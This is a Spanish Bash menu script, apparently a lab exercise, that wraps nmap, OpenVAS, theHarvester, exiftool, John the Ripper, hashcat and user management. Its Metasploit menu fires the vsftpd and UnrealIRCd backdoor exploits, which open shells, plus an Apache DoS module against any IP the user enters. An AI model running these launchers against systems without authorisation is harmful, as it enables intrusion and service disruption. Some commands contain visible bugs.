#!/bin/bash
#Autor: Aimar Estebanez Gaston
#bash-version:5.2.15(1)-release
#Scrip para la ejecucion de diferentes herramientas.

#FUNCIONES:
#Funciones Generales del programa:
#Saludar:
function fun_saludar() {
    # Elige una de las dos condiciones de manera aleatoria
    if (( RANDOM % 2 ));
    then
      figlet -f Fuzzy.flf Hola campeon | lolcat
    else
      figlet -f maxiwi.flf Deja de tocar pesao | lolcat
    fi

    # Confirmacion para avanzar
    read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
}
#Buscador de ficheros o directorios:
function func_busqueda() {
    i_fich=0
    while true
    do
      clear
      fun_menu_general "Busqueda de ficheros"
      fun_menu_busqueda
      read -rp $'\e[33mElige una opcion\e[0m: ' i_fich
      case $i_fich in
        1)#Busqueda con find
          echo "BUSCANDO CON FIND: "
          read -rp "Intrduzca el nombre del fichero que desea encontrar: " nombrefichero
          find / -name "*$nombrefichero*" 2>/dev/null
          # Confirmacion para avanzar
          read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
        ;;
        2)#Busqueda con locate
          echo "BUSCANDO CON LOCATE:"
          read -rp "Intrduzca el nombre del fichero que desea encontrar: " nombrefichero
          sudo updatedb 2>/dev/null
          locate -i "$nombrefichero" 2>/dev/null
          # Confirmacion para avanzar
          read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
        ;;
        3)#Busqueda Ejecutable con which
          echo "BUSCANDO EJECUTABLE CON WHICH:"
          read -rp "Intrduzca el nombre del ejecutable que desea encontrar: " nombrefichero
          sudo which "$nombrefichero" 2>/dev/null
          # Confirmacion para avanzar
          read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
        ;;
        4)#Busqueda con whereis
          echo "BUSCANDO EJECUTABLE CON WHEREIS:"
          read -rp "Intrduzca el nombre del ejecutable que desea encontrar: " nombrefichero
          sudo whereis "$nombrefichero" 2>/dev/null
          # Confirmacion para avanzar
          read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
        ;;
        5)
          break
        ;;
        *)
          echo -e "${ROJO}ERROR: Opcion no valida${ND}"
          sleep 0.5
        ;;
      esac
    done
}
#Ataque de diccionario:
function fun_ataque_dicci() {
  i_ataque=0
  while true
  do
    clear
    fun_menu_general "ATAQUE DE DICCIONARIO "
    fun_menu_fingerprinting_atac
    read -rp $'\e[33mElige una opcion\e[0m: ' i_ataque
    case $i_ataque in
      1)#Creacion del hash
        read -rp "Introduzca la cadena a HASH-ar: " cadena
        fun_elec_algoritmo
        echo -n "$cadena" | "$formato"sum | awk '{print $1}' > temp.txt  #Fichero temporal
        cat temp.txt
        vhash=$(cat temp.txt)
        # Confirmacion para avanzar
        read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
      ;;
      2)#Ataque con JOHN
        #Comprobacion del tipo de encriptacion
        hashid -m "$vhash"
        #Control valor variable formato
        read -rp "Introduzca el algoritmo [md5, sha1, sha256 o sha512]: " formato
        while [[ "$formato" != "md5" && "$formato" != "sha1" && "$formato" != "sha256" && "$formato" != "sha512" ]]
        do
          echo -e "${ROJO}Opcion incorrecta, introduzca uno de los especificados${ND}"
          read -rp "Introduzca el algoritmo [md5, sha1, sha256 o sha512]: " formato
        done
        fun_elec_dicc
        ficherohash=$(date '+%F-%H-%S')_hash__resultado.txt
        #Ataque de diccionario
        john --wordlist="$pathdiccionario" --format=Raw-"$formato" temp.txt > /dev/null 2>&1 &
        john --show temp.txt --format=Raw-"$formato" | awk -F ":" '/\?:/{print "La contraseña es:", $2}'| tee "$ficherohash"
        # Confirmacion para avanzar
        read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
      ;;
      3)#Ataque con HASCAT
        fun_elec_dicc
        #hashcat -m 0 -a 0 temp.txt "$pathdiccionario" |grep "$vhash"| awk -F: '{print "La contrasenia es: " $2}'| grep -v '^$'| head -n 1 > resultado.txt
        ficherohash=$(date '+%F-%H-%S')_hash__resultado.txt
        hashcat -m 0 -a 0  temp.txt "$pathdiccionario" > /dev/null 2>&1 &
        hashcat -m 0 -a 0  --show temp.txt | awk -F ":" '{print "La contraseña es:", $2}' | tee "$ficherohash"
        # Confirmacion para avanzar
        read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
      ;;
      4)
        break
      ;;
      *)
        echo -e "${ROJO}ERROR: Opcion no valida${ND}"
        sleep 0.5
      ;;
    esac
  done
rm -f temp.txt 2>&1
}
#Fingerprinting:
function fun_fingerprinting() {
  i_finger=0
  while true
  do
    clear
    #Menu fingerprint
    fun_menu_general "Fingerprint"
    fun_menu_fingerprinting
    read -rp $'\e[33mElige una opcion\e[0m: ' i_finger
    case $i_finger in
      1)#NMAP
        fun_menu_general "NMAP"
        read -rp "Especifique el objetivo: " objetivo_nmap
        #Control varible parametros
        read -rp "Introduzca el algoritmo [ sX, sC, sV  o sN ]: " parametros
        while [[ "$parametros" != "sX" && "$parametros" != "sC" && "$parametros" != "sV" && "$parametros" != "sN" ]]
        do
          echo -e "${ROJO}Opcion incorrecta, introduzca uno de los especificados${ND}"
          read -rp "Introduzca el algoritmo [ sX, sC, sV  o sN ]: " parametros
        done
        echo "Puertos abiertos de la IP: $objetivo_nmap"
        ficheronmap=$(date '+%F-%H-%S')nmap__resultado.txt
        #Ejecucion comando nmap
        sudo nmap -"$parametros" "$objetivo_nmap" |   awk 'NR>4 {buffer = buffer $0 ORS} END {split(buffer, lines, ORS); for (i=1; i<=length(lines)-3; i++) print lines[i]}' | tee "$ficheronmap"
        # Confirmacion para avanzar
        read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
      ;;
      2)#Iniciar OpenVas
        fun_menu_general "OPENVAS"
        sudo gvm-start
        read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
      ;;
      3)#Detener OpenVas
        sudo gvm-stop 2>&1
        echo "Openvas detenido"
        read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
      ;;
      4)
        break
      ;;
      *)
        echo -e "${ROJO}ERROR: Opcion no valida${ND}"
        seleep 0.5
      ;;
    esac
  done
}
#footprinting:
function fun_footprinting() {
  i_metadatos=0
  while true
  do
    fun_menu_general "footprinting"
    fun_menu_footprinting
    read -rp $'\e[33mElige una opcion\e[0m: ' i_metadatos
    case $i_metadatos in
      1)
        echo "CONSULTAR METADATOS"
        #CONSULTAR METADATOS
        i_exif=0
        while true
        do
          fun_menu_general "footprinting"
          fun_menu_metasploit_show
          read -rp $'\e[33mElige una opcion\e[0m: ' i_exif
          #Case para las funcionalidades del menu
          case $i_exif in
            1)#Metadatos de la ruta actual
              echo "Mostrando los metadatos de los archivos de la ruta actual:"
              exiftool ""*
              # Confirmacion para avanzar
              read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
            ;;
            2)#Metadatos de la ruta especifica
              read -rp "ESpecifique la ruta de la cual quiera obterner los metadatos: " ruta_metadatos
              exiftool "$ruta_metadatos"/*
              # Confirmacion para avanzar
              read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
            ;;
            3)#Metadatosm de fichero especifico
              read -rp "Especifique el fichero del cual quiera obterner los metadatos: " fichero_metadatos
              exiftool -U "$fichero_metadatos"
              # Confirmacion para avanzar
              read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
            ;;
            4)#TheHarvester
              echo "THEHARVESTER"
              read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
            ;;
            5)#Salida del submenu
              break
            ;;
            *)
              echo -e "${ROJO}ERROR: Opcion no valida${ND}"
              sleep 0.5
            ;;
          esac
        done
      ;;
      2)
        #EDITAR METADATOS
        i_editar=0
        while true
        do
          fun_menu_general "footprinting"
          fun_menu_metasploit_edit
          case $i_editar in
            1)#Eliminar todos

              fun_meta_edit
              exiftool -all= "$pathFichero"
              read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
            ;;
            2)#Editar CREATOR
              fun_meta_edit
              fun_meta_param "CREADOR"
              sudo exiftool -creator="$valorParametro" "$pathFichero"
              read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
            ;;
            3)#Editar AUTHOR
              fun_meta_edit
              fun_meta_param "AUTOR"
              sudo exiftool -author="$valorParametro" "$pathFichero"
              read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
            ;;
            4)#Editar LANGUAGE
              fun_meta_edit
              fun_meta_param "IDIOMA"
              sudo exiftool -language="$valorParametro" "$pathFichero"
              read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
            ;;
            5)#Editar CREATE DATE
              fun_meta_edit
              fun_meta_param "FECHA DE CREACION"
              sudo exiftool -createdate="$valorParametro" "$pathFichero"
              read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
            ;;
            6)#VolverAtras
              break
            ;;
            *)
              echo -e "${ROJO}ERROR: Opcion no valida${ND}"
              sleep 0.5
            ;;
          esac
        done
      ;;
      3)#THE HARVESTER
        fun_menu_general "THE HARVESTER"
        read -rp "Introduzca el dominio objetivo: " dominioObjetivo
        read -rp "Introduzca el algoritmo [ bing, brave, yahoo o duckduckgo ]: " buscador
        while [[ "$buscador" != "bing" && "$buscador" != "brave" && "$buscador" != "yahoo" && "$buscador" != "duckduckgo" ]]
        do
          echo -e "${ROJO}Opcion incorrecta, introduzca uno de los especificados${ND}"
          read -rp "Introduzca el algoritmo [ bing, brave, yahoo o duckduckgo ]: " buscador
        done
        read -rp "Introduzca la cantidad de busquedas que desea hacer: " numeroBusquedas
        sudo theHarvester -d "$dominioObjetivo" -l "$numeroBusquedas" -b "$buscador"
        read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
      ;;
      4)
        break
      ;;
      *)
        echo -e "${ROJO}ERROR: Opcion no valida${ND}"
        sleep 0.5
      ;;
    esac
  done
}
#Gestion de usuarios:
function fun_usr() {
  #While para el submenu de usuarios
  i_usu=0
  while true
  do
    fun_menu_usr
    read -rp $'\e[33mElige una opcion\e[0m: ' i_usu
    case $i_usu in
      1)#Creacion de usuario
        fun_menu_general "Ceracion de usuario"
        read -rp "Introduzca el nombre de usuario: " nombreusuario
        read -rsp "Introduzca la contrasenia: " contrasena
        echo -e '\n'
        read -rsp "Repita la contrasenia: " contrasena2
        #Comprobacion contrasenia
        if [ "$contrasena" = "$contrasena2" ]
        then
          contrasena=$(openssl passwd "$contrasena")
          sudo useradd "$nombreusuario" --password "$contrasena"
        else
          echo "Las contrasenas no coinciden"
        fi
        # Confirmacion para avanzar
        read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
      ;;
      2)#Modificar usuario
        fun_menu_general "modifica usuario"
        i_usu_mod=0
        while true
        do
          fun_menu_usr_mod
          read -rp $'\e[33mElige una opcion\e[0m: ' i_usu_mod
          case $i_usu_mod in
          1) #Cambio de nombre
            read -rp "Introduzca el nombre del usuario que desea modificar: " nombreviejo
            #Comprovacion si usuario existe
            nombreviejo=$(fun_ctrl_usu "$nombreviejo")
            read -rp "Introduzca el nuevo nombre de usuario: " nuevonombre
            sudo usermod -l "$nuevonombre" "$nombreviejo"
            echo "NOMBRE DE USUARIO ACTUALIZADO"
            # Confirmacion para avanzar
            read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
          ;;
          2)#Cambiar HOME
            #Comprovacion si usuario existe
            read -rp "Introduzca el nombre del usuario que desea modificar: " nombreusu
            nombreusu=$(fun_ctrl_usu "$nombreusu")
            #Comprovacion directorio existe
            read -rp "Introduzca la ruta del nuevo home del usuario: " nuevohome
            until [[ -n $nuevohome && -d $nuevohome ]]; do
              read -rp "Introduzca la ruta del nuevo home del usuario: " nuevohome
            done
            #Cambio
            sudo usermod --home "$nuevohome" "$nombreusu"
            # Confirmacion para avanzar
            read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
          ;;
          3)#Fecha caducidad
            #Comprovacion si usuario existe
            read -rp "Introduzca el nombre del usuario que desea modificar: " nombreusu
            nombreusu=$(fun_ctrl_usu "$nombreusu")
            #Comprovacion fecha en formato YYYY-MM-DD
            read -rp "Introduzca la nueva fecha de caducidad en formato YYYY-MM-DD: " fechacad
            if [[ $fechacad =~ ^[0-9]{4}-[0-9]{2}-[0-9]{2}$ ]] && date -d "$fechacad" >/dev/null 2>&1
            then
              echo "Modificando usuario: "
              sudo usermod --expiredate "$fechacad" "$nombreusu"
            else
              echo "Fecha no valida o en formato incorrecto"
            fi
            # Confirmacion para avanzar
            read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
          ;;
          4)#Añadir a grupo
            #Comprovacion si usuario existe
            read -rp "Introduzca el nombre del usuario que desea modificar: " nombreusu
            nombreusu=$(fun_ctrl_usu "$nombreusu")
            read -rp "Introduzca los grupos a los que quiere añadir: " grupos
            sudo usermod -a --groups "$grupos" "$nombreusu"
            # Confirmacion para avanzar
            read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
          ;;
          5)#Contraseña
            #Comprovacion si usuario existe
            read -rp "Introduzca el nombre del usuario que desea modificar: " nombreusu
            nombreusu=$(fun_ctrl_usu "$nombreusu")
            #Peticion de contraseñas a usuario
            read -rsp "Introduzca la contrasenia: " contrasena
            echo " "
            read -rsp "Repita la contrasenia: " contrasena2
            echo ""
            #Comprobacion contrasenia
            if [ "$contrasena" = "$contrasena2" ]
            then
              contrasena=$(openssl passwd "$contrasena")
              sudo usermod --password "$contrasena" "$nombreusu"
            else
              echo "Las contrasenas no coinciden"
            fi
            # Confirmacion para avanzar
            read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
          ;;
          6)#Cambio de shell
            #Comprovacion si usuario existe
            read -rp "Introduzca el nombre del usuario que desea modificar: " nombreusu
            nombreusu=$(fun_ctrl_usu "$nombreusu")
            #Comprovacion de shell correcta
            read -rp "Introduzca la nueva shell para el usuario [/bin/bash, /bin/sh, /bin/zsh]: " nuevashell
            while [[ "$nuevashell" != "/bin/bash" && "$nuevashell" != "/bin/sh" && "$nuevashell" != "/bin/zsh" ]]
            do
              echo -e "${ROJO}Opcion incorrecta, introduzca una de los especificados${ND}"
              read -rp "Introduzca la nueva shell para el usuario [/bin/bash, /bin/sh, /bin/zsh]: " nuevashell
            done
            sudo usermod --shell "$nuevashell" "$nombreusu"
            # Confirmacion para avanzar
            read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
          ;;
          7)#Bloquear
            #Comprovacion si usuario existe
            read -rp "Introduzca el nombre del usuario que desea modificar: " nombreusu
            nombreusu=$(fun_ctrl_usu "$nombreusu")
            sudo usermod --lock "$nombreusu"
            # Confirmacion para avanzar
            read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
          ;;
          8)#Desbloquear
            #Comprovacion si usuario existe
            read -rp "Introduzca el nombre del usuario que desea modificar: " nombreusu
            nombreusu=$(fun_ctrl_usu "$nombreusu")
            sudo usermod --unlock "$nombreusu"
            # Confirmacion para avanzar
            read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
          ;;
          9)
            break
          ;;
          *)
            echo -e "${ROJO}ERROR: Opcion no valida${ND}"
            sleep 0.5
          ;;
          esac
        done
      ;;
      3)#Eliminacion de usuario
        fun_menu_general "Eliminar usuario"
        read -rp "Introduzca el nombre de usuario que desea eliminar: " nombreusuario
        #Confirmacion de eliminacion de usuario
        read -rp "CONFIRMACION: realmente quiere eliminar el usuario? (s/n)" confirmacion
        if [ "$confirmacion" = "s" ] || [ "$confirmacion" = "S" ]
        then
          sudo userdel "$nombreusuario"
        else
          echo "Operacion abortada"
        fi
        # Confirmacion para avanzar
        read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
      ;;
      4)#Comprobacion de cambios de usuarios
        fun_menu_general "Cambios en usuarios"
        read -rp "Introduzca el nombre del usuario que desea comprobar: " nombreusu
        nombreusu=$(fun_ctrl_usu "$nombreusu")
        sudo cat /etc/passwd | grep "$nombreusu"
        sudo cat /etc/shadow | grep "$nombreusu"
        sudo cat /etc/group | grep "$nombreusu"
        finger "$nombreusu"
        read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
      ;;
      5)
        break
      ;;
      *)
        echo -e "${ROJO}ERROR: Opcion no valida${ND}"
        sleep 0.5
      ;;
    esac
  done
}
#Ataque con Metasploit:
function fun_metasploit() {
  i_msfconsole=0
  while true
  do
    fun_menu_general "Ataque con MSFCONSOLE"
    fun_menu_msfconsole
    read -rp $'\e[33mElige una opcion\e[0m: ' i_msfconsole
    case $i_msfconsole in
      1)#VSFTPD
        #Definicion de las variables
        read -rp "Especifica la ip objetivo: " ipObjetivo
        read -rp "Especifica el puerto: " puertObjetivo
        #Ataque desde mfconsole
        msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set payload cmd/unix/interact; set RHOSTS $ipObjetivo; set RPORT $puertObjetivo; run; exit "
        read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
      ;;
      2)#Apache DoS
        #Definicion de las variables
        read -rp "Especifica la ip objetivo: " ipObjetivo
        read -rp "Especifica la cantidad de paquetes a enviar: " cantidadPaquetes
        read -rp "Especifica el puerto: " puertObjetivo
        #Ataque desde mfconsole
        msfconsole -q -x "dos/http/apache_commons_fileupload_dos;set payload cmd/unix/interact; set RHOSTS $ipObjetivo; set RLIMIT $cantidadPaquetes ; set RPORT $puertObjetivo; run; exit "
        read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
      ;;
      3)#Ataque a MySQL
        #Definicion de las variables
        read -rp "Especifica la ip objetivo: " ipObjetivo
        read -rp "Especifica el puerto: " puertObjetivo
        #Ataque desde mfconsole
        msfconsole -q -x "use scanner/mysql/mysql_login;set payload cmd/unix/interact; set RHOSTS $ipObjetivo; set RPORT $puertObjetivo; run; exit "
        read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
      ;;
      4)#Ataque UnrealIRCD
        #Definicion de las variables
        read -rp "Especifica la ip objetivo: " ipObjetivo
        read -rp "Especifica el puerto: " puertObjetivo
        #Ataque desde mfconsole
        msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor ; set RHOSTS $ipObjetivo; set RPORT $puertObjetivo;set payload cmd/unix/bind_ruby;  exploit "
        read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
      ;;
      5)
        break
      ;;
      *)
        echo -e "${ROJO}ERROR: Opcion no valida${ND}"
        sleep 0.5
      ;;
    esac
  done
}

#Funciones Miscelanea:
#Funcion test existencia fichero
function fun_meta_edit(){
	read -rp "Introduzca la ruta del fichero: " pathFichero
	until [[ -n $pathFichero && -f $pathFichero ]]; do
		read -rp "Introduzca la ruta del fichero: " pathFichero
	done
}
#Funcion eleccion de parametros en exiftool
function fun_meta_param(){
	read -rp "Introduzca el nuevo valor del parametro $1: " valorParametro
	return "$valorParametro" 2>/dev/null
}
#Control de nombre de usuarios
function fun_ctrl_usu(){
	local nombre=$1
	while true; do
		#Comprueba si usuario existe
		if id "$nombre" >/dev/null 2>&1; then
			echo "$nombre"
			break
		else
			read -rp "ERROR: el usuario no existe, introduzca uno nuevo: " nombre
		fi
	done
}
#Funcion eleccion de diccionario
function fun_elec_dicc(){
	i_dic=0
			while true
			do
				clear
				fun_menu_general "ATAQUE DE DICCIONARIO"
				fun_menu_fingerprinting_dic "$(whoami)"
				read -rp "Indique el diccionario que desea emplear: " i_dic
				
				case $i_dic in 
					1)#Password.lst
						if [[ -e /usr/share/john/password.lst ]]
						then
							pathdiccionario="/usr/share/john/password.lst"
							break
						else
							echo "ERROR: No se encuentra el diccionario"
							sleep 0.5
							break
						fi
					;;
					2)#rockyou.txt
						if [[ -e /home/$(whoami)/rockyou.txt ]]
						then
							pathdiccionario="/home/$(whoami)/rockyou.txt"
							break
						else
							echo "ERROR: No se encuentra el diccionario"
							sleep 0.5
							break
						fi
					;;
					3)#especifica la ruta
						read -rp "Introduzca la ruta del diccionario: " pathdiccionario
						until [[ -e $pathdiccionario ]]; do
							read -rp "Introduzca la ruta del diccionario: " pathdiccionario
						done
						break
					;;
					4)
						break
					;;
					*)
						echo "Opcion no valia"
						sleep 0.5
					;;
				esac
			done
			return "$pathdiccionario" 2>/dev/null
	}
#Funcion eleccion de algoritmo
function fun_elec_algoritmo() {
    i_algoritmo=0
    while true
    do
      #[md5, sha1, sha256 o sha512]
      clear
      fun_menu_general "Eleccion de algoritmo"
      fun_menu_ataque_dicci
      read -rp "Introduzca una opcion: " i_algoritmo
      case  $i_algoritmo in
        1)#md5
          formato="md5"
          break
        ;;
        2)#sha1
          formato="sha1"
          break
        ;;
        3)#sha256
          formato="sha256"
          break
        ;;
        4)#sha512
           formato="sha512"
           break
        ;;
        5)
		   break
        ;;
        *)
          echo -e "${ROJO}ERROR: Opcion no valida${ND}"
          sleep 0.5
        ;;
      esac
    done
    return "$formato" 2>/dev/null
}

#Menus:
#Menu eleccion de algortimo en 3.ataque
function fun_menu_ataque_dicci() {

  echo -e "${CIAN}1.${ND}MD5."
	echo -e "${CIAN}2.${ND}SHA1."
	echo -e "${CIAN}3.${ND}SHA256."
	echo -e "${CIAN}4.${ND}SHA512."
	echo -e "${ROJO}5.Volver atras.${ND} "
	echo -e "${AZUL}========================${ND}"
}
#Menu ataque con metasploitable
function fun_menu_msfconsole(){
	
	echo -e "${CIAN}1.${ND}Ataque a Vsftpd."
	echo -e "${CIAN}2.${ND}Ataque DoS a Apache."
	echo -e "${CIAN}3.${ND}Ataque a MySQL."
	echo -e "${CIAN}4.${ND}Ataque a UnrealIRCD."
	echo -e "${ROJO}5.Volver atras.${ND} "
	echo -e "${AZUL}========================${ND}"
}
#Menu busqueda de ficheros
function fun_menu_busqueda(){
	echo -e "${CIAN}1.${ND}Busqueda con FIND."
	echo -e "${CIAN}2.${ND}Busqueda con LOCATE."
	echo -e "${CIAN}3.${ND}Busqueda de ejecutable con WHICH."
	echo -e "${CIAN}4.${ND}Busqueda de ejecutable con WHEREIS."
	echo -e "${ROJO}5.Volver atras.${ND} "
	echo -e "${AZUL}========================${ND}"
}
#Menu ataque de diccionaro
function fun_menu_fingerprinting_atac(){
	echo -e "${CIAN}1.${ND}Crear HASH."
	echo -e "${CIAN}2.${ND}Ataque de diccionario con John The Ripper."
	echo -e "${CIAN}3.${ND}Ataque de diccionario con Hascat."
	echo -e "${ROJO}4.Volver atras.${ND} "
	echo -e "${AZUL}========================${ND}"
}
#Menu diccionario
function fun_menu_fingerprinting_dic(){
	echo 			"Eleccion de Diccionario"
	echo -e "${AZUL}========================${ND}"
	echo -e "${CIAN}1.${ND} password.lst en /usr/share/john."
	echo -e "${CIAN}2.${ND} rockyou en /home/$1."
	echo -e "${CIAN}3.${ND} Otro en otra localizacion."
	echo -e "${ROJO}4.Volver atras.${ND} "
	echo -e "${AZUL}========================${ND}"
}
#Menu Modificacion de usuarios
function fun_menu_usr_mod(){
	clear
	fun_menu_general "Modificar usuarios"
	echo -e "${CIAN}1.${ND} Nombre de usuario."	
	echo -e "${CIAN}2.${ND} Cambiar Home."
	echo -e "${CIAN}3.${ND} Fecha de caducidad."
	echo -e "${CIAN}4.${ND} Añadir a grupos."	
	echo -e "${CIAN}5.${ND} Contrasena."	
	echo -e "${CIAN}6.${ND} Shell."	
	echo -e "${CIAN}7.${ND} Bloquear."	
	echo -e "${CIAN}8.${ND} Desbloquear."	
	echo -e "${ROJO}9.${ND} Volver atras."
	echo -e "${AZUL}========================${ND}"
}
#Menu Gestion de usuarios
function fun_menu_usr (){
	clear
	fun_menu_general "Gestion de usuarios"
	echo -e "${CIAN}1.${ND} Crear usuario."
	echo -e "${CIAN}2.${ND} Editar Usuario."
	echo -e "${CIAN}3.${ND} Eliminar usuario."
	echo -e "${CIAN}4.${ND} Comprobar cambios de usuario."
	echo -e "${ROJO}5.${ND} Volver atras."
	echo -e "${AZUL}========================${ND}"
}
#Menu Fingerprint
function fun_menu_fingerprinting(){
	echo -e "${CIAN}1.${ND}Herramienta nmap."
	echo -e "${CIAN}2.${ND}Iniciar OpenVas."
	echo -e "${CIAN}3.${ND}Detener OpenVas."
	echo -e "${ROJO}4.Volver atras.${ND}"
	echo -e "${AZUL}========================${ND}"
	}
#Menu metadatos
function fun_menu_footprinting(){
	
	echo -e "${CIAN}1.${ND}Consultar metadatos."
	echo -e "${CIAN}2.${ND}Modificar metadatos."
	echo -e "${CIAN}3.${ND}The Harvester."
	echo -e "${ROJO}4.Volver atras.${ND}"
	echo -e "${AZUL}========================${ND}"
}
#Menu edicion metadatos
function fun_menu_metasploit_edit(){
	echo -e "${CIAN}1.${ND}Eliminar TODOS los metadatos."
	echo -e "${CIAN}2.${ND}Modificar CREADOR."
	echo -e "${CIAN}3.${ND}Modificar AUTOR."
	echo -e "${CIAN}4.${ND}Modificar IDIOMA."
	echo -e "${CIAN}5.${ND}Modificar FECHA DE CREACION."
	echo -e "${ROJO}6.Volver atras.${ND}"
	echo -e "${AZUL}========================${ND}"
	read -rp $'\e[33mElige una opcion\e[0m: ' i_editar
}
#Menu exiftool
function fun_menu_metasploit_show (){
	echo -e "${CIAN}1.${ND} Metadatos de los ficheros de la ruta acutal."
	echo -e "${CIAN}2.${ND} Metadatos de la ruta especifica."
	echo -e "${CIAN}3.${ND} Metadatos de fichero especifico."
	echo -e "${CIAN}4.${ND} The Harvester."
	echo -e "${ROJO}5.Volver atras.${ND}"
	echo -e "${AZUL}========================${ND}"
}
#Menu general 
function fun_menu_general (){
	clear
	echo -e "${AZUL}========================${ND}"
	echo -e "----- ${ROJO}$1${ND} ------"
	
	echo -e "${AZUL}========================${ND}"
}
#Menu principal 
function fun_menu_principal (){	 
	clear
	#Parte bonita menu
	figlet -f Big.flf menu | lolcat
	echo -e "${AZUL}========================${ND}"
	echo -e "--------- ${AZUL}MENU${ND} ---------"
	echo -e "${AZUL}========================${ND}"
	echo -e "${CIAN}1.${ND} Saludar."
	echo -e "${CIAN}2.${ND} Buscador de ficheros."
	echo -e "${CIAN}3.${ND} Ataque de diccionario."
	echo -e "${CIAN}4.${ND} Fingerprinting."
	echo -e "${CIAN}5.${ND} footprinting."
	echo -e "${CIAN}6.${ND} Gestion de usuarios."
	echo -e "${CIAN}7.${ND} Ataque con metasploit."
	echo -e "${ROJO}8. Salir.${ND}"
	echo -e "${AZUL}========================${ND}"
}

#Variables para colorear
AZUL='\033[0;34m'
CIAN='\033[0;36m'
ROJO='\033[0;31m'
ND='\033[0m' # nada	

#Instalacion de dependencias

read -rp "Quiere instalar las dependencias? (s/n)" dependencias
if [ "$dependencias" = "s" ] || [ "$dependencias" = "S" ]
then 
    echo "Instalando dependencias"
    sudo apt update
    sudo apt install -y toilet
    sudo apt install -y figlet
    sudo rm -R /usr/share/figlet
    sudo mkdir /usr/share/figlet/
    sudo git clone https://github.com/xero/figlet-fonts.git /usr/share/figlet
    sudo apt install -y john
    sudo apt install -y wordlists
    sudo apt install -y debsums
    sudo apt install -y hashcat
    sudo apt install -y libimage-exiftool-perl
    sudo apt install -y theharvester
    sudo apt install -y metasploit-framework
    sudo apt install -y finger
    sudo apt install -y lolcat
    read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
fi

#Script:
#Bucle principal del programa
i=0
while true
do
	fun_menu_principal
	#Bucle control valor variable i dentro de parametros
		read -rp $'\e[33mElige una opcion\e[0m: ' i
	case $i in
		1)
		  #Saludar
			fun_saludar
		;;
		2)
		  #Busqueda de ficheros
      func_busqueda
		;;
		3) #Ataque de diccionario
			fun_ataque_dicci
		;;
		4) #Fingerprint
			fun_fingerprinting
		;;
		5) #footprinting		
			fun_footprinting
		;;
		6) #Gestion de usuarios
		  fun_usr
		;;
		7) #Ataque con msfconsole
				fun_metasploit
		;;
		8) #Salir
			exit
		;;
		*)
			echo -e "${ROJO}ERROR: Opcion no valida${ND}"
			sleep 0.5
		;;
	esac
done
